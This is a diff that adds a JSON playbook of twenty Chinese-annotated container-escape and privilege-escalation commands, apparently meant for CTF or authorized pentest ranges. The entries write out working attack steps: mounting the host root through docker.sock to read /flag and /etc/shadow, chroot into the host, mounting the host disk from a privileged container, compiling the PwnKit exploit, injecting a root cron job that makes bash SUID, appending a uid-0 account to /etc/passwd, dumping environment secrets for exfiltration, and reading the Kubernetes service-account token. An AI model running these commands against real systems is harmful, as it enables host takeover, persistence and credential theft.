@@ -1,0 +1,162 @@
+[
+  {
+    "id": "ce-1",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "检测 docker.sock 挂载",
+    "cmd": "ls -la /var/run/docker.sock",
+    "note": "文件存在即说明宿主 docker daemon 的 unix socket 已挂进容器；这是最典型、最易用的逃逸前置，命中后看 ce-3/ce-4/ce-5。"
+  },
+  {
+    "id": "ce-2",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "检测当前用户是否在 docker 组",
+    "cmd": "id; getent group docker",
+    "note": "在 docker 组可直接操作宿主 daemon；即便不在组，只要 ce-1 命中 socket 仍可能利用（视 socket 权限）。"
+  },
+  {
+    "id": "ce-3",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "探测 docker 客户端可用性",
+    "cmd": "which docker && docker ps",
+    "note": "能跑通 docker ps 即说明已能与宿主 docker 通信，可直接起新容器逃逸。"
+  },
+  {
+    "id": "ce-4",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "挂载宿主根读 flag",
+    "cmd": "docker run --rm -v /:/host busybox cat /host/flag",
+    "note": "把宿主 / 挂到新容器 /host，直接读取宿主敏感文件（如 /flag、/etc/shadow）。"
+  },
+  {
+    "id": "ce-5",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "经 socket 起容器并 chroot 宿主",
+    "cmd": "docker run -it --rm -v /:/host ubuntu chroot /host",
+    "note": "将宿主根挂进新容器并 chroot，获得宿主文件系统与 shell；进一步可写宿主 crontab/authorized_keys 持久化。"
+  },
+  {
+    "id": "ce-6",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "打印当前 capabilities",
+    "cmd": "capsh --print",
+    "note": "查看 bounding set 是否含 cap_sys_admin 等危险能力；存在即具备 dind/特权逃逸潜力。"
+  },
+  {
+    "id": "ce-7",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "查看 CapEff 判断特权容器",
+    "cmd": "grep Cap /proc/self/status",
+    "note": "CapEff 接近全 f（如 0000003fffffffff）说明接近特权容器；cap_sys_admin 在列即可 mount 宿主设备。"
+  },
+  {
+    "id": "ce-8",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "列举宿主块设备/磁盘",
+    "cmd": "fdisk -l",
+    "note": "能看到宿主磁盘（如 /dev/sda1、/dev/vda1）说明容器对宿主存储有访问权，可直接挂载逃逸。"
+  },
+  {
+    "id": "ce-9",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "特权容器挂载宿主盘逃逸",
+    "cmd": "mkdir -p /tmp/h && mount /dev/sda1 /tmp/h && chroot /tmp/h",
+    "note": "特权容器可 mount 宿主设备；挂载宿主根后 chroot 即获宿主权限。盘符以 ce-8 输出为准。"
+  },
+  {
+    "id": "ce-10",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "检测 pkexec 存在与版本",
+    "cmd": "which pkexec; pkexec --version",
+    "note": "pkexec 存在且 polkit 版本 ≤ 0.105 时大概率受 CVE-2021-4034（PwnKit）影响，配合 ce-11 提权。"
+  },
+  {
+    "id": "ce-11",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "PwnKit 编译与利用",
+    "cmd": "gcc cve-2021-4034.c -o pwnkit && ./pwnkit",
+    "note": "在命中 ce-10 的靶机上编译授权靶场提供的 PwnKit PoC 源码并执行即提 root；编译需 gcc，无 gcc 改用预编译二进制。"
+  },
+  {
+    "id": "ce-12",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "枚举 cron 配置",
+    "cmd": "cat /etc/crontab; ls -la /etc/cron.*; cat /etc/cron.d/*",
+    "note": "查看 root 级定时任务及其调用脚本路径，定位可写目标用于 ce-13/ce-14 劫持。"
+  },
+  {
+    "id": "ce-13",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "查找可写脚本",
+    "cmd": "find / -writable -name \"*.sh\" 2>/dev/null",
+    "note": "可写 .sh 若被 root 的 cron 调用，即可追加命令实现 root 提权（容器内常跑 backup/health 脚本）。"
+  },
+  {
+    "id": "ce-14",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "向 root cron 追加命令",
+    "cmd": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/x",
+    "note": "若 /etc/cron.d 可写即注入 root 任务，下一分钟 bash 置 SUID；替换命令可执行反弹 shell 持久化。"
+  },
+  {
+    "id": "ce-15",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "递归查找文件 capabilities",
+    "cmd": "getcap -r / 2>/dev/null",
+    "note": "列出所有带 cap 的可执行文件，逐一排查可被利用的能力（见 ce-16）。"
+  },
+  {
+    "id": "ce-16",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "重点可利用 cap 排查",
+    "cmd": "getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace'",
+    "note": "cap_setuid 可 setuid(0)；cap_dac_read_search 可绕过读权限读 /etc/shadow；cap_sys_ptrace 可注入进程。"
+  },
+  {
+    "id": "ce-17",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "检测 /etc/passwd 可写",
+    "cmd": "[ -w /etc/passwd ] && echo passwd_writable",
+    "note": "可写则直接追加 uid=0 的 root 账户（如 echo 'x::0:0::/:/bin/bash' >> /etc/passwd）提权。"
+  },
+  {
+    "id": "ce-18",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "检测 /etc/shadow 可读",
+    "cmd": "[ -r /etc/shadow ] && echo shadow_readable",
+    "note": "可读则离线破解或复用宿主机/容器 root 哈希，常用于横向到宿主。"
+  },
+  {
+    "id": "ce-19",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "容器内敏感环境变量泄露",
+    "cmd": "env | grep -iE 'pass|token|secret|key|aws|kube'",
+    "note": "容器常把云凭据/数据库密码写进 env，先 dump 再外带；命中即可能直接拿下云 or 数据库。"
+  },
+  {
+    "id": "ce-20",
+    "category": "容器逃逸",
+    "os": "Linux",
+    "title": "K8s ServiceAccount token 探测（可选）",
+    "cmd": "ls -la /var/run/secrets/kubernetes.io/serviceaccount/ && cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+    "note": "可选：在 Pod 内该路径存在即说明挂载了 SA token，可配合 kubectl --token 对 API Server 横向；非 k8s 环境无此文件。"
+  }
+]
